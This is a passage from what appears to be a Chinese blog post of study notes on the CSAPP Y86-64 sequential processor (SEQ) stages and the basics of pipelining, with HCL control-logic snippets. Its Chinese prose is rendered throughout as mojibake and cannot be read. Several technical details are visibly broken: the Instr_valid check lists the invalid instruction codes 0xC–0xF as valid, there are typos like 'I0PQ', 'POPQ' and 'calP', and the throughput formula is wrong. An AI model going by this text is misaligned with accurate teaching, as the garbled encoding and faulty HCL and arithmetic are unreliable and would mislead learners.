src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-pushq%E5%AE%9E%E7%8E%B0.png"></p><h3 id="SEQç¡¬ä»¶ç»“æ„"><a href="#SEQç¡¬ä»¶ç»“æ„" class="headerlink" title="SEQç¡¬ä»¶ç»“æ„"></a>SEQç¡¬ä»¶ç»“æ„</h3><p>è¦å®Œæˆ y86-64 æŒ‡ä»¤çš„å…­ä¸ªåŸºæœ¬é˜¶æ®µï¼Œéœ€è¦ç›¸åº”çš„ç¡¬ä»¶ç»“æ„ï¼Œå¦‚ä¸‹å›¾ä¸ºç¡¬ä»¶ç»“æ„å¯¹åº”çš„æŠ½è±¡è¡¨ç¤ºï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-SEQ%E7%A1%AC%E4%BB%B6%E7%BB%93%E6%9E%84.png"></p><p>ç¡¬ä»¶å•å…ƒä¸å„ä¸ªé˜¶æ®µç›¸å…³è”ï¼š</p><ul><li>å–æŒ‡ï¼šå°† PC ä½œä¸ºåœ°å€ä»å¯¹åº”çš„å†…å­˜ä¸­è¯»å–æŒ‡ä»¤ï¼ŒPC å¢åŠ å™¨è®¡ç®—æŒ‡ä»¤é•¿åº¦å¹¶å°†æ–°çš„ PC æš‚æ—¶æ”¾å…¥å€¼ valP å½“ä¸­</li><li>è¯‘ç ï¼šä»å¯„å­˜å™¨æ–‡ä»¶ä¸­åŒæ—¶è¯»å–å¯¹åº”å¯„å­˜å™¨çš„å€¼ï¼Œå¾—åˆ°ä¸¤ä¸ªæ“ä½œæ•°</li><li>æ‰§è¡Œï¼šæ ¹æ®æŒ‡ä»¤ç±»å‹ï¼Œå°†ç®—æ•°&#x2F;é€»è¾‘å•å…ƒç”¨äºä¸åŒçš„ç›®çš„ï¼Œæ‰§è¡ŒæŒ‡å®šè¿ç®—ã€æ”¹å˜æŒ‡é’ˆæˆ–è€…è®¡ç®—æœ‰æ•ˆåœ°å€ç­‰ç­‰ã€‚è¿™ä¸€æ­¥å¯èƒ½ä¼šæ›´æ–°æ ‡å¿—å¯„å­˜å™¨</li><li>è®¿å­˜ï¼šå¯¹å†…å­˜è¿›è¡Œè®¿é—®ï¼ˆè¯»&#x2F;å†™ï¼‰</li><li>å†™å›ï¼šå°†æ–°çš„å¯„å­˜å™¨å€¼æ›´æ–°åˆ°å¯„å­˜å™¨æ–‡ä»¶ä¸­ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªå†™ç«¯å£ï¼Œ E ç”¨äºæ¥æ”¶ ALU è®¡ç®—çš„ç»“æœã€valM ç”¨äºæ¥æ”¶è¯»å–å†…å­˜çš„ç»“æœã€‚</li><li>PC æ›´æ–°ï¼šæ ¹æ®é¢„å…ˆä¿å­˜çš„åœ°å€æˆ–è€…æ˜¯ä¹‹å‰è®¡ç®—çš„æŒ‡ä»¤é¢„è®¡çš„ä¸‹ä¸€æ­¥ä½ç½®å»æ›´æ–° PCã€‚</li></ul><h3 id="SEQçš„æ—¶åº"><a href="#SEQçš„æ—¶åº" class="headerlink" title="SEQçš„æ—¶åº"></a>SEQçš„æ—¶åº</h3><p>SEQ çš„å®ç°åŒ…æ‹¬ç»„åˆé€»è¾‘å’Œä¸¤ç§å­˜å‚¨å™¨è®¾å¤‡ï¼šæ—¶é’Ÿå¯„å­˜å™¨ï¼ˆç¨‹åºè®¡æ•°å™¨å’Œæ¡ä»¶ç å¯„å­˜å™¨ï¼‰ï¼Œéšæœºè®¿é—®å­˜å‚¨å™¨ï¼ˆå¯„å­˜å™¨æ–‡ä»¶ã€æŒ‡ä»¤å†…å­˜å’Œæ•°æ®å†…å­˜ï¼‰ã€‚</p><p>ç»„åˆé€»è¾‘ä¸éœ€è¦ä»»ä½•æ—¶åºæˆ–æ§åˆ¶ï¼Œåªè¦è¾“äººå˜åŒ–äº†ï¼Œå€¼å°±é€šè¿‡é€»è¾‘é—¨ç½‘ç»œä¼ æ’­ã€‚å…¶ä¸­è¯»éšæœºè®¿é—®å­˜å‚¨å™¨çš„æ“ä½œå¯ä»¥ç®€åŒ–åœ°çœ‹ä½œæ˜¯ä¸€ä¸ªç«‹å³å“åº”è¾“å…¥åœ°å€çš„ç»„åˆé€»è¾‘æ“ä½œã€‚</p><p>ç¨‹åºè®¡æ•°å™¨ã€ æ¡ä»¶ç å¯„å­˜å™¨ã€æ•°æ®å†…å­˜å’Œå¯„å­˜å™¨æ–‡ä»¶è¿™å››ä¸ªç¡¬ä»¶éœ€è¦æœ‰æ˜ç¡®çš„æ—¶åºæ§åˆ¶ã€‚è¿™äº›å•å…ƒé€šè¿‡ä¸€ä¸ªæ—¶é’Ÿä¿¡å·æ¥æ§åˆ¶ï¼Œå®ƒè§¦å‘å°†æ–°å€¼è£…è½½åˆ°å¯„å­˜å™¨ï¼Œä»¥åŠå°†å€¼å†™åˆ°éšæœºè®¿é—®å­˜å‚¨å™¨ã€‚ç”±äºæˆ‘ä»¬éµå¾ª<strong>ä»ä¸å›è¯»</strong>çš„åŸåˆ™ï¼Œæˆ‘ä»¬åªéœ€è¦æ§åˆ¶å†…å­˜å’Œå¯„å­˜å™¨çš„æ—¶é’Ÿæ§åˆ¶ä¿¡å·ã€‚</p><blockquote><p>ä»ä¸å›è¯»ï¼šå¤„ç†å™¨ä»æ¥ä¸éœ€è¦ä¸ºäº†å®Œæˆä¸€æ¡æŒ‡ä»¤çš„æ‰§è¡Œè€Œå»è¯»ç”±è¯¥æŒ‡ä»¤æ›´æ–°äº†çš„çŠ¶æ€ã€‚</p></blockquote><h3 id="SEQé˜¶æ®µçš„å®ç°"><a href="#SEQé˜¶æ®µçš„å®ç°" class="headerlink" title="SEQé˜¶æ®µçš„å®ç°"></a>SEQé˜¶æ®µçš„å®ç°</h3><p>æˆ‘ä»¬ä¸ºä¸åŒçš„å¸¸æ•°å€¼èµ‹äºˆäº†ä¸åŒçš„æ„ä¹‰ï¼ŒåŒ…æ‹¬æŒ‡ç¤ºæŒ‡ä»¤ä»£ç ã€åŠŸèƒ½ç ã€å¯„å­˜å™¨å€¼å’ŒALUçŠ¶æ€ç­‰ç­‰ã€‚å…·ä½“å¦‚ä¸‹è¡¨ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E5%B8%B8%E6%95%B0%E5%90%AB%E4%B9%89.png"></p><p>å…¶ä¸­ nop æŒ‡ä»¤å¤„äº†å°† pc åŠ  1 ä¸è¿›è¡Œä»»ä½•æ“ä½œï¼›halt æŒ‡ä»¤è®¾ç½®å¤„ç†å™¨çŠ¶æ€ï¼Œå¯¼è‡´ç¨‹åºåœæ­¢è¿è¡Œã€‚</p><h4 id="å–æŒ‡é˜¶æ®µ"><a href="#å–æŒ‡é˜¶æ®µ" class="headerlink" title="å–æŒ‡é˜¶æ®µ"></a>å–æŒ‡é˜¶æ®µ</h4><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E5%8F%96%E6%8C%87.png"></p><p>å–æŒ‡é˜¶æ®µåŒ…æ‹¬æŒ‡ä»¤å†…å­˜ç¡¬ä»¶å•å…ƒï¼Œä»¥ PC ä½œä¸ºç¬¬ä¸€ä¸ªå­—èŠ‚ï¼ˆå­—èŠ‚ 0ï¼‰çš„åœ°å€ï¼Œè¿™ä¸ªå•å…ƒä¸€æ¬¡ä»å†…å­˜è¯»å‡º 10 ä¸ªå­—èŠ‚ã€‚</p><p>10å­—èŠ‚ä¸­çš„ç¬¬ä¸€ä¸ªå­—èŠ‚è¢«è§£é‡ŠæˆæŒ‡ä»¤å­—èŠ‚ï¼ˆSplitï¼‰ï¼Œåˆ†ä¸ºä¸¤ä¸ª4ä½çš„netæ•°ã€‚å®ƒåˆè¢«åˆ†å‰²å¾—åˆ° icode å’Œ ifun ã€‚æ ¹æ® icode çš„å€¼ï¼Œä¼šè¿›ä¸€æ­¥åˆ¤æ–­æŒ‡ä»¤æ˜¯å¦åˆæ³•ã€æ˜¯å¦åŒ…å«å¯„å­˜å™¨æˆ–è€…å¸¸æ•°ã€‚</p><p>å¯¹åº”çš„ Instr valid ã€Need_regidsã€Need_valC ç”¨ HCL è¡¨ç¤ºå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs HCL">Instr_valid=<br>icode in&#123;<br>0xC,0xD,0xE,0xF    // æ£€æŸ¥æ²¡æœ‰è¢«èµ‹äºˆç‰¹æ®Šæ„ä¹‰çš„å¸¸æ•°ï¼Œä¹Ÿå°±æ˜¯æ£€æŸ¥æ˜¯å¦åˆæ³•<br>&#125;ï¼›<br><br>Need_regids =<br>icode in &#123; <br>    IRRMOVQ,IOPQ,IPUSHQ,IPOPQ,<br>    IIRMOVQ,IRMMOVQ,IMRMOVQ<br>&#125;;<br><br>Need_valC=<br>icode in&#123;<br>IIRMOVQ,IMRMOVQ,IRMMOVQ,<br>IJXX,ICALL<br>&#125;ï¼›<br></code></pre></td></tr></table></figure><h4 id="è¯‘ç å’Œå†™å›é˜¶æ®µ"><a href="#è¯‘ç å’Œå†™å›é˜¶æ®µ" class="headerlink" title="è¯‘ç å’Œå†™å›é˜¶æ®µ"></a>è¯‘ç å’Œå†™å›é˜¶æ®µ</h4><p>è¿™ä¸¤ä¸ªé˜¶æ®µéƒ½è¦è®¿é—®å¯„å­˜å™¨æ–‡ä»¶ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E8%AF%91%E7%A0%81%E5%92%8C%E5%86%99%E5%9B%9E.png"></p><p>å¯„å­˜å™¨æ–‡ä»¶æœ‰å››ä¸ªç«¯å£ï¼Œå®ƒæ”¯æŒåŒæ—¶è¿›è¡Œä¸¤ä¸ªè¯»å’Œä¸¤ä¸ªå†™ã€‚</p><p>æ¯ä¸ªç«¯å£éƒ½æœ‰ä¸€ä¸ªåœ°å€è¿æ¥å’Œä¸€ä¸ªæ•°æ®è¿æ¥ï¼Œåœ°å€è¿æ¥æ˜¯ä¸€ä¸ªå¯„å­˜å™¨ IDï¼Œè€Œæ•°æ®è¿æ¥æ˜¯ä¸€ç»„ 64 æ ¹çº¿è·¯ï¼Œæ—¢å¯ä»¥ä½œä¸ºå¯„å­˜å™¨æ–‡ä»¶çš„è¾“å‡ºå­—ï¼ˆå¯¹è¯»ç«¯å£æ¥è¯´ï¼‰ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå®ƒçš„è¾“äººå­—ï¼ˆå¯¹å†™ç«¯å£æ¥è¯´ï¼‰ã€‚ ä¸¤ä¸ªè¯»ç«¯å£çš„åœ°å€è¾“äººä¸º srcA å’Œ srcBï¼Œè€Œä¸¤ä¸ªå†™ç«¯å£çš„åœ°å€è¾“äººä¸º dstE å’Œ dstMã€‚å¦‚æœæŸä¸ªåœ°å€ç«¯å£ä¸Š çš„å€¼ä¸ºç‰¹æ®Šæ ‡è¯†ç¬¦ OxF(RNONE)ï¼Œåˆ™è¡¨æ˜ä¸éœ€è¦è®¿é—® å¯„å­˜å™¨ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ srcA å’Œ srcB å†³å®šæˆ‘ä»¬ä»å“ªä¸ªå¯„å­˜å™¨è¯»æ•°æ®ï¼Œå¯¹åº”ä» valA å’Œ valB ä¸­è¯»å‡ºã€‚åŒç† destE å’Œ destM å†³å®šè¦å»å†™å“ªä¸ªå¯„å­˜å™¨ï¼Œå¯¹åº”æ•°æ®ä» valE å’Œ valM ä¸­å†™å…¥ã€‚</p><p>å››ä¸ªç«¯å£çš„ HCL æè¿°å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs hcl">word srcA=[<br>icode in &#123;IRRMOVQ,IRMMOVQ,IOPQ,IPUSHQ&#125;:rA;<br>//åªæœ‰åœ¨ rrmovqï¼Œrmmovqï¼ŒOPqï¼Œpushq æŒ‡ä»¤éœ€è¦è¯»å–æ“ä½œæ•°æ‰€åŒ…å«çš„å¯„å­˜å™¨<br>icode in &#123;IPOPQ, IRET &#125; : RRSP;<br>//åœ¨ popq å’Œ ret ä¸¤ä¸ªæŒ‡ä»¤æ‰§è¡Œçš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦é¢å¤–è¯»å–ä¸€ä¸ª rsp å¯„å­˜å™¨<br>    1 : RNONE; <br>];<br><br>word srcB = [<br>    icode in &#123;IRMMOVQ, IMRMOVQ, IOPQ  &#125; : rB;<br>    icode in &#123;IPOPQ, IRET, ICALL, IPUSHQ &#125; : RRSP;<br>    1 : RNONE; # Don&#x27;t need register<br>];<br><br>word dstE = [<br>    icode in &#123; IRRMOVQ &#125; : rB;<br>    icode in &#123; IIRMOVQ, I0PQ&#125; : rB;<br>    icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;<br>    1 : RNONE; # Don&#x27;t write any register<br>];<br><br>word dstM = [<br>icode in &#123;IMRMOVQ,POPQ&#125;:rA;<br>1 : RNONE;<br>];<br></code></pre></td></tr></table></figure><h4 id="æ‰§è¡Œ"><a href="#æ‰§è¡Œ" class="headerlink" title="æ‰§è¡Œ"></a>æ‰§è¡Œ</h4><p>æ‰§è¡Œé˜¶æ®µåŒ…æ‹¬ç®—æ•°&#x2F;é€»è¾‘å•å…ƒï¼ˆALUï¼‰ï¼Œè¿™ä¸ªå• å…ƒæ ¹æ® alufun ä¿¡å·çš„è®¾ç½®ï¼Œå¯¹è¾“äºº aluA å’Œ aluB æ‰§è¡Œ ADDã€SUBTRACTã€ AND æˆ– EXCLUSIVEOR è¿ç®—ã€‚è¿™äº›æ•°æ®å’Œæ§åˆ¶ä¿¡å·æ˜¯ç”±ä¸‰ä¸ªæ§åˆ¶å—äº§ç”Ÿçš„ã€‚ALU çš„è¾“å‡ºå°±æ˜¯ valE ä¿¡å·ã€‚</p><p>å¦‚ä¸‹å›¾ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%89%A7%E8%A1%8C.png"></p><p>æ‰§è¡Œé˜¶æ®µçš„ç¬¬ä¸€æ­¥å°± æ˜¯æ¯æ¡æŒ‡ä»¤çš„ ALU è®¡ç®—ã€‚åˆ—å‡ºçš„æ“ä½œæ•° aluB åœ¨ å‰é¢ï¼Œåé¢æ˜¯ aluAï¼Œè¿™æ ·æ˜¯ä¸ºäº†ä¿è¯ subq æŒ‡ä»¤æ˜¯ valB å‡å» valA ã€‚</p><p>æˆ‘ä»¬ç”¨å¦‚ä¸‹çš„ HCL è¡¨è¾¾å¼æ¥æè¿° aluA çš„è¡Œä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs hcl">word aluA=[<br>    icode in &#123; IRRMOVQ,IOPQ&#125;:valA; <br>    icode in &#123; IIRMOVQ,IRMMOVQ,IMRMOVQ&#125;:valC; <br>    icode in &#123; ICALL,IPUSHQ&#125;:-8; <br>    icode in &#123; IRET,IPOPQ&#125;:8;<br>    #Other instructions don&#x27;t need ALU<br>];<br></code></pre></td></tr></table></figure><p>aluA çš„è®¡ç®—æ–¹å¼å–å†³äºæŒ‡ä»¤çš„ç±»å‹ï¼Œä¸»è¦æ¶‰åŠäº†ä¸åŒæŒ‡ä»¤çš„æºæ“ä½œæ•°ã€‚å…·ä½“çš„è®¡ç®—æ–¹å¼å¦‚ä¸‹ï¼š</p><ul><li>å¯¹äº <code>OPq </code> æŒ‡ä»¤ï¼Œ<code>aluA</code> çš„å€¼ç­‰äºä»å¯„å­˜å™¨ <code>rA</code> ä¸­è¯»å–çš„ <code>valA </code>ã€‚</li><li>å¯¹äº <code>rrmovq </code> æŒ‡ä»¤ï¼Œ<code>aluA </code>çš„å€¼ç­‰äº <code>valA</code>ï¼Œå› ä¸ºè¿™ä¸ªæŒ‡ä»¤æ˜¯ç®€å•çš„æ•°æ®ä¼ é€ï¼Œå°† <code>valA </code>èµ‹å€¼ç»™ç›®çš„å¯„å­˜å™¨ã€‚</li><li>å¯¹äº <code>irmovq </code> æŒ‡ä»¤ï¼Œ<code>aluA </code>çš„å€¼ç­‰äº <code>valC</code>ï¼Œå› ä¸ºè¿™ä¸ªæŒ‡ä»¤å°†ç«‹å³æ•°ï¼ˆå¸¸æ•°ï¼‰<code>valC </code>èµ‹å€¼ç»™ç›®çš„å¯„å­˜å™¨ã€‚</li><li>å¯¹äº <code>rmmovq  </code> å’Œ <code>mrmovq</code> æŒ‡ä»¤ï¼Œ<code>aluA </code>çš„å€¼ç­‰äº <code>valC</code>ï¼Œå› ä¸ºè¿™äº›æŒ‡ä»¤éœ€è¦ä»æŒ‡ä»¤ä¸­æå–ç«‹å³æ•° <code>valC </code>å¹¶ä¸ç›®çš„å¯„å­˜å™¨çš„å€¼ç›¸åŠ ã€‚</li></ul><p>åŒç†ï¼ŒaluBä¹Ÿæ˜¯å¦‚æ­¤ï¼Œå…·ä½“çš„è®¡ç®—æ–¹å¼å…¥ä¸‹ï¼š</p><ul><li>å¯¹äº <code>rmmovq</code>ã€<code>mrmovq</code>ã€<code>OPq</code>ã€<code>call</code>ã€<code>pushq</code>ã€<code>ret</code> å’Œ <code>popq</code> æŒ‡ä»¤ï¼Œ<code>aluB</code> çš„å€¼ç­‰äºä»å¯„å­˜å™¨<code>rB</code>ä¸­è¯»å–çš„<code>valB</code>ã€‚</li><li>å¯¹äº <code>rrmovq</code> å’Œ <code>irmovq</code> æŒ‡ä»¤ï¼Œ<code>aluB</code> çš„å€¼ä¸º0ï¼Œå› ä¸ºè¿™äº›æŒ‡ä»¤åªæ˜¯æ•°æ®ä¼ é€ï¼Œæ‰€ä»¥ <code>aluB</code> ä¸º0ã€‚</li></ul><p>è§‚å¯Ÿ ALU åœ¨æ‰§è¡Œé˜¶æ®µæ‰§è¡Œçš„æ“ä½œï¼Œå¯ä»¥çœ‹åˆ°å®ƒé€šå¸¸ä½œä¸ºåŠ æ³•å™¨æ¥ä½¿ç”¨ã€‚ä¸è¿‡ï¼Œå¯¹äº oPq æŒ‡ä»¤ï¼Œæˆ‘ä»¬å¸Œæœ›å®ƒä½¿ç”¨æŒ‡ä»¤ ifun å­—æ®µä¸­ç¼–ç çš„æ“ä½œå®ç°å…¶ä»–è¿ç®—ã€‚</p><p>æˆ‘ä»¬æœ‰ä¸€ä¸ªä¿¡å· ALUfun æ¥æ§åˆ¶ ALUè¿›è¡Œä»€ä¹ˆæ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™æ ·æè¿° :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs hcl">word alufun = [<br>icode == IOPQ : ifun;<br>//åªåœ¨æ‰§è¡Œ OPq æŒ‡ä»¤çš„æ—¶å€™æ ¹æ® func åŠŸèƒ½ä½å»é€‰æ‹©è¿ç®—ç§ç±»<br>1 : ALUADD;<br>]<br></code></pre></td></tr></table></figure><p>å½“æ‰§è¡Œ OPqæŒ‡ä»¤æ—¶ï¼Œæˆ‘ä»¬å¸Œæœ›è®¾ç½®æ¡ä»¶ç ï¼Œå¯¹æ­¤ä¹Ÿæœ‰ä¸€ä¸ªä¿¡å·æ¥æ§åˆ¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hcl">bool set_cc = icode in &#123;IOPQ&#125;;<br></code></pre></td></tr></table></figure><h4 id="è®¿å­˜"><a href="#è®¿å­˜" class="headerlink" title="è®¿å­˜"></a>è®¿å­˜</h4><p>è®¿å­˜é˜¶æ®µçš„ä»»åŠ¡å°±æ˜¯è¯»æˆ–è€…å†™ç¨‹åºæ•°æ®ã€‚ä¸¤ä¸ªæ§åˆ¶å—äº§ç”Ÿå†…å­˜åœ°å€å’Œå†…å­˜è¾“å…¥æ•°æ®ï¼ˆä¸ºå†™æ“ä½œï¼‰çš„å€¼ã€‚å¦å¤–ä¸¤ä¸ªå—äº§ç”Ÿè¡¨æ˜åº”è¯¥æ‰§è¡Œè¯»æ“ä½œè¿˜æ˜¯å†™æ“ä½œçš„æ§åˆ¶ä¿¡å·ã€‚å½“æ‰§è¡Œè¯»æ“ä½œæ—¶ï¼Œ æ•°æ®å†…å­˜äº§ç”Ÿå€¼ valMã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E8%AE%BF%E5%AD%98.png"></p><h4 id="æ›´æ–°-PC"><a href="#æ›´æ–°-PC" class="headerlink" title="æ›´æ–° PC"></a>æ›´æ–° PC</h4><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%9B%B4%E6%96%B0PC.png"></p><p>SEQçš„æœ€åé˜¶æ®µä¼šæ›´æ–°ç¨‹åºè®¡æ•°å™¨çš„å€¼ï¼Œæ ¹æ®æŒ‡ä»¤ç±»å‹å’Œæ˜¯å¦è¦é€‰æ‹©åˆ†æ”¯ï¼Œæ–°çš„PCå¯èƒ½æ˜¯ valCã€valM æˆ– calPã€‚</p><h1 id="æµæ°´çº¿çš„é€šç”¨åŸç†"><a href="#æµæ°´çº¿çš„é€šç”¨åŸç†" class="headerlink" title="æµæ°´çº¿çš„é€šç”¨åŸç†"></a>æµæ°´çº¿çš„é€šç”¨åŸç†</h1><p>SQE çš„ç¼ºç‚¹æ˜¯è¦åœ¨ä¸€ä¸ªå‘¨æœŸå†…å®Œæˆæ‰€æœ‰çš„æ“ä½œï¼Œå¿…é¡»æŠŠæ—¶é’Ÿå‘¨æœŸå®šçš„å¾ˆæ…¢ï¼Œè¿™æ ·ä¸èƒ½å……åˆ†åˆ©ç”¨æˆ‘ä»¬çš„ç¡¬ä»¶å•å…ƒã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¼•å…¥æµæ°´çº¿æ¥æˆ–è·å¾—æ›´å¥½çš„æ€§èƒ½ã€‚</p><p>æ‰€è°“æµæ°´çº¿å°±æ˜¯æˆ‘ä»¬æ‰€ç†ŸçŸ¥çš„å·¥å‚æµæ°´çº¿ã€è‡ªåŠ¨æ´—è½¦æœºè¿™ç§â€œæµæ°´çº¿åŒ–â€çš„ç³»ç»Ÿã€‚åœ¨æµæ°´çº¿ç³»ç»Ÿä¸­ï¼Œå¾…æ‰§è¡Œçš„ä»»åŠ¡è¢«åˆ’åˆ†æˆäº†è‹¥å¹²ä¸ªç‹¬ç«‹çš„éƒ¨åˆ†ï¼Œè€Œè¿™äº›éƒ¨åˆ†æ˜¯åŒæ—¶è¿›è¡Œçš„ã€‚å°±åƒæ±½è½¦åŠ å·¥å‚æ‹§èºä¸çš„æœºå™¨ä¸€ç›´åœ¨æ‹§èºä¸ï¼Œè€Œä¸æ˜¯ç­‰ä¸€è¾†è½¦åˆ¶ä½œå®Œæˆåå†æ‹§ä¸‹ä¸€é¢—èºä¸ã€‚</p><h3 id="è®¡ç®—æµæ°´çº¿"><a href="#è®¡ç®—æµæ°´çº¿" class="headerlink" title="è®¡ç®—æµæ°´çº¿"></a>è®¡ç®—æµæ°´çº¿</h3><p>ä¸‹å›¾æ˜¯ä¸€ä¸ªéæµæ°´çº¿åŒ–çš„ç¡¬ä»¶ç³»ç»Ÿçš„ä¾‹å­</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E9%9D%9E%E6%B5%81%E6%B0%B4%E7%BA%BF%E7%A1%AC%E4%BB%B6.png"></p><p>ç”±ä¸€äº›æ‰§è¡Œè®¡ç®—çš„é€»è¾‘ä»¥åŠä¸€ä¸ªä¿å­˜ç»“æœçš„å¯„å­˜å™¨ç»„æˆï¼Œæ—¶é’Ÿä¿¡å·ä¼šåœ¨æ¯ä¸ªç‰¹å®šçš„æ—¶é—´é—´éš”å»ä¿å­˜å¯„å­˜å™¨ã€‚</p><p>å›¾ä¸­çš„è®¡ç®—å—æ˜¯ç”¨ç»„åˆé€»è¾‘æ¥å®ç°çš„ï¼Œæ„å‘³ç€ä¿¡å·ä¼šç©¿è¿‡ä¸€ç³»åˆ—é€»è¾‘é—¨ï¼Œåœ¨ä¸€å®šæ—¶é—´çš„å»¶è¿Ÿä¹‹åï¼Œè¾“å‡ºå°±æˆä¸ºäº†è¾“å…¥çš„æŸä¸ªå‡½æ•°ã€‚</p><p>ä¸‹å›¾åˆæ˜¯ä¸€å¼ æµæ°´çº¿åŒ–çš„ç³»ç»Ÿ</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%B5%81%E6%B0%B4%E7%BA%BF%E7%A1%AC%E4%BB%B6.png"></p><p>æˆ‘ä»¬å°†ä¸¤ä¸ªç³»ç»Ÿå¯¹æ¯”æ¥çœ‹ï¼Œæˆ‘ä»¬å‡è®¾è¿ä¸ªç³»ç»Ÿè¿è¡ŒåŒä¸€ä¸ªç¨‹åºï¼Œè¿ç®—é€»è¾‘éœ€è¦300psï¼ŒåŠ è½½å¯„å­˜å™¨éœ€è¦ 20psï¼Œé‚£ä¹ˆéæµæ°´çº¿åŒ–çš„æŒ‡ä»¤å‘¨æœŸå°±æ˜¯ 320psã€‚æˆ‘ä»¬å°†è¿ç®—åˆ†ä¸º3ä¸ªéƒ¨åˆ†ï¼Œæ¯ä¸ªé˜¶æ®µéœ€è¦100psã€‚ç„¶ååœ¨å„ä¸ªé˜¶æ®µä¹‹é—´æ”¾ä¸Šæµæ°´çº¿å¯„å­˜å™¨ï¼Œè¿™æ ·æ¯æ¡æŒ‡ä»¤éƒ½ä¼šæŒ‰ç…§è¿™ä¸‰æ­¥ç»è¿‡è¿™ä¸ªç³»ç»Ÿï¼Œä»å¤´åˆ°å°¾å®Œæˆä¸€æ¬¡å°±éœ€è¦ä¸‰ä¸ªå®Œæ•´çš„æ—¶é’Ÿå‘¨æœŸã€‚</p><blockquote><p>psï¼ˆçš®ç§’ï¼Œ10e-12Sï¼‰ æ˜¯æ—¶é—´å•ä½</p><p>ååé‡ä»¥åäº¿æ¡æŒ‡ä»¤ &#x2F;Sï¼ˆGIPSï¼‰ä½œä¸ºå•ä½ï¼Œåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œè¿™ä¸ªç³»ç»Ÿçš„ååé‡å°±æ˜¯ 1&#x2F;(320Ã—10^12)</p></blockquote><p>è¿™æ ·å°±å¯ä»¥è®©ä¸‰ä¸ªé˜¶æ®µåŒæ—¶åœ¨å·¥ä½œï¼Œå¢åŠ æ•ˆç‡ï¼Œä½†æ˜¯æ‰§è¡Œå•æ¡æŒ‡ä»¤æ‰€éœ€æ—¶é—´å¢åŠ ã€‚ä¾‹å¦‚åŒæ ·æ˜¯è¿™ä¸ªè®¡ç®—é€»è¾‘ï¼Œæˆ‘ä»¬æ‰§è¡Œä¸‰æ¬¡ï¼Œéæµæ°´çº¿åŒ–çš„ç¨‹åºéœ€è¦ä¸‰ä¸ªå®Œæ•´çš„å‘¨æœŸ 960ps ï¼Œè€Œæµæ°´çº¿åŒ–çš„ç¨‹åºåªéœ€è¦ 600ps 